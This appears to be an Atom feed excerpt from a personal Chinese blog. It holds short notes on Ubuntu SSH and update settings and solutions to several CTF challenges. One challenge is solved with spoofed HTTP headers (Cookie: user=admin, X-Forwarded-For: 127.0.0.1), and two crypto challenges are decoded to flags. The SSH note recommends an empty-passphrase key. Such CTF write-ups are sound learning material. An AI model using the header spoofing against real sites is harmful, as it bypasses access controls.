class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#验证配置</span><br><span class="line">ip a show ens33</span><br><span class="line">ping -c 4 8.8.8.8   </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#确保SSH服务正常运行</span><br><span class="line">sudo apt install openssh-server</span><br><span class="line">sudo systemctl start ssh</span><br><span class="line">sudo systemctl enable ssh</span><br></pre></td></tr></table></figure><p><img src="/images/Pastedimage20250601213334.png"></p><h4 id="使用-SSH-密钥登录（最安全）"><a href="#使用-SSH-密钥登录（最安全）" class="headerlink" title="使用 SSH 密钥登录（最安全）"></a><strong>使用 SSH 密钥登录（最安全）</strong></h4><ol><li>在物理机生成密钥对：<br> ssh-keygen  # 默认保存到 ~&#x2F;.ssh&#x2F;id_rsa&#x3D;&#x3D;(空密码)&#x3D;&#x3D;<br><img src="/images/Pastedimage20250601214315.png">）</li><li>将公钥复制到虚拟机：<br> scp C:\Users\Rhea.ssh\id_rsa.pub <a href="mailto:&#x72;&#104;&#x65;&#97;&#x40;&#49;&#57;&#x32;&#x2e;&#x31;&#x36;&#56;&#46;&#x31;&#52;&#50;&#46;&#49;&#51;&#50;">rhea@192.168.142.132</a>:~&#x2F;<br><img src="/images/Pastedimage20250601214846.png">）</li><li>直接免密登录：<br><img src="/images/Pastedimage20250601221831.png">）</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;sudo -i #root用户&lt;br&gt; ls -l &amp;#x2F;etc&amp;#x2F;netplan&lt;br&gt;&lt;img src=&quot;/images/Pastedimage20250601205045.png&quot;&gt;&lt;br&gt;sudo chmod 600 &amp;#x2F;etc&amp;#x2F;ne</summary>
      
    
    
    
    <category term="Ubuntu" scheme="https://rhea006.github.io/categories/Ubuntu/"/>
    
    
  </entry>
  
  <entry>
    <title>关闭自动更新</title>
    <link href="https://rhea006.github.io/2025/06/7f46169c13bc.html"/>
    <id>https://rhea006.github.io/2025/06/7f46169c13bc.html</id>
    <published>2025-06-14T14:00:00.000Z</published>
    <updated>2025-06-15T12:29:41.948Z</updated>
    
    <content type="html"><![CDATA[<p><code>sudo nano /etc/apt/apt.conf.d/20auto-upgrades</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">APT::Periodic::Update-Package-Lists &quot;0&quot;;</span><br><span class="line">APT::Periodic::Download-Upgradeable-Packages &quot;0&quot;;</span><br><span class="line">APT::Periodic::AutocleanInterval &quot;0&quot;;</span><br><span class="line">APT::Periodic::Unattended-Upgrade &quot;0&quot;;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;code&gt;sudo nano /etc/apt/apt.conf.d/20auto-upgrades&lt;/code&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;sp</summary>
      
    
    
    
    <category term="Ubuntu" scheme="https://rhea006.github.io/categories/Ubuntu/"/>
    
    
  </entry>
  
  <entry>
    <title>ez_http</title>
    <link href="https://rhea006.github.io/2025/06/5a69eaa25605.html"/>
    <id>https://rhea006.github.io/2025/06/5a69eaa25605.html</id>
    <published>2025-06-14T14:00:00.000Z</published>
    <updated>2025-06-18T06:30:04.372Z</updated>
    
    <content type="html"><![CDATA[<p>bp抓包<br><img src="/images/%7B3AD6ED26-D5D6-4348-AF13-B5279A3A9036%7D.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET：?FantasyLand=0xLE4KCODE</span><br><span class="line">POST：lyc0ris=goat</span><br><span class="line"></span><br><span class="line">请求头：</span><br><span class="line">Referer: https://www.tzc.edu.cn/</span><br><span class="line">User-Agent: SansBrowser</span><br><span class="line">Cookie: user=admin</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br></pre></td></tr></table></figure><p>用hackbar也行</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;bp抓包&lt;br&gt;&lt;img src=&quot;/images/%7B3AD6ED26-D5D6-4348-AF13-B5279A3A9036%7D.png&quot;&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;</summary>
      
    
    
    
    <category term="WEB" scheme="https://rhea006.github.io/categories/WEB/"/>
    
    
  </entry>
  
  <entry>
    <title>代码演示</title>
    <link href="https://rhea006.github.io/2025/06/5c75ebd024e9.html"/>
    <id>https://rhea006.github.io/2025/06/5c75ebd024e9.html</id>
    <published>2025-06-14T14:00:00.000Z</published>
    <updated>2025-06-15T12:06:35.400Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">a</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;hello world&quot;</span>)<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;hello world&quot;</span>)<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;hello world&quot;</span>)<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;hello world&quot;</span>)<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;hello world&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span </summary>
      
    
    
    
    <category term="code" scheme="https://rhea006.github.io/categories/code/"/>
    
    
  </entry>
  
  <entry>
    <title>大杂烩</title>
    <link href="https://rhea006.github.io/2025/06/228350e34cac.html"/>
    <id>https://rhea006.github.io/2025/06/228350e34cac.html</id>
    <published>2025-06-14T14:00:00.000Z</published>
    <updated>2025-06-18T06:30:04.355Z</updated>
    
    <content type="html"><![CDATA[<p>SkpERzY0Q0ZKRlpGVTJLU0dWVUVLVFNMT1JVRkFNM1lJVkhFVzNDWUpaWVRPNkE9</p><p>base64<br>JJDG64CFJFZFU2KSGVUEKTSLORUFAM3YIVHEW3CYJZYTO6A&#x3D;<br>base32<br>JFopEIrZiR5hENKthP3xENKlXNq7x<br>xxencode<br>GMPSynt{Penml_Pelcgb}<br>Rot13<br><img src="/images/%7BECF67C34-79AB-4AA8-A6AF-D1D146E8F829%7D.png"><br>TZCFlag{Crazy_Crypto}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;SkpERzY0Q0ZKRlpGVTJLU0dWVUVLVFNMT1JVRkFNM1lJVkhFVzNDWUpaWVRPNkE9&lt;/p&gt;
&lt;p&gt;base64&lt;br&gt;JJDG64CFJFZFU2KSGVUEKTSLORUFAM3YIVHEW3CYJZYTO6A&amp;#x3D;&lt;b</summary>
      
    
    
    
    <category term="Crypto" scheme="https://rhea006.github.io/categories/Crypto/"/>
    
    <category term="常见编码" scheme="https://rhea006.github.io/categories/Crypto/%E5%B8%B8%E8%A7%81%E7%BC%96%E7%A0%81/"/>
    
    
  </entry>
  
  <entry>
    <title>RSA1</title>
    <link href="https://rhea006.github.io/2025/06/0208f5194904.html"/>
    <id>https://rhea006.github.io/2025/06/0208f5194904.html</id>
    <published>2025-06-14T14:00:00.000Z</published>
    <updated>2025-06-15T12:12:31.577Z</updated>
    
    <content type="html"><![CDATA[<p>p &#x3D; 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229<br>q &#x3D; 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469<br>dp &#x3D; 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929<br>dq &#x3D; 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041<br>c &#x3D; 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</p><p>&#x3D;&#x3D;dp,dq  是<code>d</code>模<code>p-1</code>和<code>q-1</code>的模逆元（在RSA中，它们通常用于快速解密，因为使用它们可以避免计算<code>d</code>，这是一个大数。&#x3D;&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">from Crypto.Util.number import long_to_bytes   #将长整数转化为字节字符串</span><br><span class="line"> </span><br><span class="line">p = 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229</span><br><span class="line">q = 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469</span><br><span class="line">dp = 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929</span><br><span class="line">dq = 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041</span><br><span class="line">c = 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</span><br><span class="line"> </span><br><span class="line">I = gmpy2.invert(q, p) </span><br><span class="line"> # 计算了q模p的模逆元。在数学上，这意味着I是一个整数，使得q * I mod p = 1。注意，这里的I并不是中国剩余定理中常用的h（h是p模q的模逆元），但在这个上下文中，我们只需要I</span><br><span class="line"> </span><br><span class="line">mp = pow(c, dp, p)   #使用模幂运算，计算c的dp次方模p的结果。</span><br><span class="line">mq = pow(c, dq, q)   #使用模幂运算，计算c的dq次方模q的结果。</span><br><span class="line"> </span><br><span class="line">m = (((mp-mq) * I) % p) * q + mq      #CRT的一个变种，用于从mp和mq中恢复明文m</span><br><span class="line"> </span><br><span class="line">print(long_to_bytes(m))    #解密后的整数m转换为字节字符串并输出 </span><br></pre></td></tr></table></figure><p> b’noxCTF{W31c0m3_70_Ch1n470wn}’→flag{W31c0m3_70_Ch1n470wn}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;p &amp;#x3D; 86376337672570085670996534865410911713204915094336154475391624379112441758856678063984117905240835534451581135022277452062053276</summary>
      
    
    
    
    <category term="Crypto" scheme="https://rhea006.github.io/categories/Crypto/"/>
    
    <category term="非对称加密（Asymmetric Cryptography）" scheme="https://rhea006.github.io/categories/Crypto/%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%EF%BC%88Asymmetric-Cryptography%EF%BC%89/"/>
    
    
  </entry>
  
</feed>
